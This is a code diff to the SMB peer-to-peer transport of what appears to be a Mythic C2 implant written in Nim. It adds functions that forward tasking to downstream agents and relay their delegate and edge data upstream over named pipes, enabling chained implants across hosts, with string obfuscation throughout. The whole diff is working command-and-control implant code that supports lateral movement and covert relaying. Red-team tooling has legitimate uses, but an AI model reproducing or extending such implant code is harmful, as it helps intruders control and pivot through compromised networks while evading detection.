@@ -9,6 +9,8 @@ import ../utils/strenc
 import ../utils/task_processor
 import ../tasks/download
 import ../tasks/upload
+import ../tasks/connect
+import ../tasks/link
 
 # Import Windows-specific tasks for chunk processing
 import ../tasks/execute_assembly
@@ -315,6 +317,54 @@ proc sendDownloadChunk(taskId: string, fileId: string, path: string, fileData: s
       obf("user_output"): "Error reading chunk: " & e.msg
     }
 
+proc forwardIncomingDelegatesSmb*(msgJson: JsonNode) =
+  ## Forward any incoming delegates from a message to downstream P2P agents
+  ## This enables multi-level P2P chaining (e.g., HTTP <- TCP <- SMB)
+  if msgJson.hasKey(obf("delegates")):
+    let delegates = msgJson[obf("delegates")]
+    for delegate in delegates:
+      if delegate.hasKey(obf("uuid")) and delegate.hasKey(obf("message")):
+        let delegateUuid = delegate[obf("uuid")].getStr()
+        let delegateMsg = delegate[obf("message")].getStr()
+        debug "[DEBUG] SMB P2P: Forwarding delegate to downstream agent ", delegateUuid
+        discard forwardDelegateToConnect(delegateUuid, delegateMsg)
+        discard forwardDelegateToLink(delegateUuid, delegateMsg)
+        # Handle rekeying if Mythic assigned a new UUID
+        if delegate.hasKey(obf("new_uuid")) or delegate.hasKey(obf("mythic_uuid")):
+          let newUuid = if delegate.hasKey(obf("new_uuid")):
+            delegate[obf("new_uuid")].getStr()
+          else:
+            delegate[obf("mythic_uuid")].getStr()
+          if newUuid != delegateUuid:
+            debug "[DEBUG] SMB P2P: Rekeying downstream from ", delegateUuid, " to ", newUuid
+            discard rekeyConnectConnection(delegateUuid, newUuid)
+            discard rekeyLinkConnection(delegateUuid, newUuid)
+
+proc collectDownstreamDelegatesSmb*(): tuple[delegates: JsonNode, edges: JsonNode] =
+  ## Collect delegate and edge data from all downstream P2P connections
+  var delegates = newJArray()
+  var edges = newJArray()
+  
+  let connectResps = checkActiveConnectConnections()
+  for resp in connectResps:
+    if resp.hasKey(obf("delegates")):
+      for d in resp[obf("delegates")]:
+        delegates.add(d)
+    elif resp.hasKey(obf("edges")):
+      for e in resp[obf("edges")]:
+        edges.add(e)
+  
+  let linkResps = checkActiveLinkConnections()
+  for resp in linkResps:
+    if resp.hasKey(obf("delegates")):
+      for d in resp[obf("delegates")]:
+        delegates.add(d)
+    elif resp.hasKey(obf("edges")):
+      for e in resp[obf("edges")]:
+        edges.add(e)
+  
+  return (delegates, edges)
+
 proc startListening*(profile: SmbProfile): bool =
   ## Start listening on the named pipe
   if profile.listening:
@@ -472,6 +522,9 @@ proc start*(profile: SmbProfile) =
           try:
             let msgJson = parseJson(decrypted)
             debug "[DEBUG] SMB P2P: Parsed JSON, checking for action or responses..."
+            
+            # Forward any incoming delegates to downstream P2P agents (multi-level P2P support)
+            forwardIncomingDelegatesSmb(msgJson)
             
             # Check for responses array (post_response from Mythic)
             if msgJson.hasKey(obf("responses")):
@@ -642,16 +695,36 @@ proc start*(profile: SmbProfile) =
               
               # Send chunks if any
               if chunksToSend.len > 0:
+                # Collect downstream delegate data (multi-level P2P)
+                let (downDelegates, downEdges) = collectDownstreamDelegatesSmb()
+                for e in downEdges:
+                  chunksToSend.add(e)
+                
                 let chunkResponse = %* {
                   obf("action"): obf("post_response"),
                   obf("responses"): chunksToSend
                 }
+                if downDelegates.len > 0:
+                  chunkResponse[obf("delegates")] = downDelegates
+                  debug "[DEBUG] SMB P2P: Including ", downDelegates.len, " downstream delegate(s) with chunk response"
                 
                 debug "[DEBUG] SMB P2P: Sending ", chunksToSend.len, " download chunk(s)"
                 let responseEncrypted = profile.encryptMessage($chunkResponse, profile.callbackUuid)
                 discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
                 continue
               
+              # No chunks to send - check if there's downstream delegate data to relay
+              let (noChunkDelegates, noChunkEdges) = collectDownstreamDelegatesSmb()
+              if noChunkDelegates.len > 0 or noChunkEdges.len > 0:
+                let delegateResponse = %* {
+                  obf("action"): obf("post_response"),
+                  obf("responses"): noChunkEdges
+                }
+                if noChunkDelegates.len > 0:
+                  delegateResponse[obf("delegates")] = noChunkDelegates
+                  debug "[DEBUG] SMB P2P: Sending ", noChunkDelegates.len, " downstream delegate(s) (no chunks)"
+                let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
+                discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
               continue
             
             # Check for action field
@@ -814,11 +887,19 @@ proc start*(profile: SmbProfile) =
                       else:
                         taskResponses.add(execResult.response)
                     
+                    # Collect downstream delegate data (multi-level P2P)
+                    let (taskDelegates, taskEdges) = collectDownstreamDelegatesSmb()
+                    for e in taskEdges:
+                      taskResponses.add(e)
+                    
                     # Send response
                     let taskingResponse = %* {
                       obf("action"): obf("post_response"),
                       obf("responses"): taskResponses
                     }
+                    if taskDelegates.len > 0:
+                      taskingResponse[obf("delegates")] = taskDelegates
+                      debug "[DEBUG] SMB P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
                     
                     debug "[DEBUG] SMB P2P: Sending ", taskResponses.len, " task response(s)"
                     let responseEncrypted = profile.encryptMessage($taskingResponse, profile.callbackUuid)
@@ -831,6 +912,18 @@ proc start*(profile: SmbProfile) =
                       break
                 else:
                   debug "[DEBUG] SMB P2P: No tasks in get_tasking response"
+                  # Even without tasks, check for downstream delegate data to relay
+                  let (noTaskDelegates, noTaskEdges) = collectDownstreamDelegatesSmb()
+                  if noTaskDelegates.len > 0 or noTaskEdges.len > 0:
+                    let delegateResponse = %* {
+                      obf("action"): obf("post_response"),
+                      obf("responses"): noTaskEdges
+                    }
+                    if noTaskDelegates.len > 0:
+                      delegateResponse[obf("delegates")] = noTaskDelegates
+                      debug "[DEBUG] SMB P2P: Sending ", noTaskDelegates.len, " downstream delegate(s) (no tasks)"
+                    let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
+                    discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
                   continue
           except:
             discard
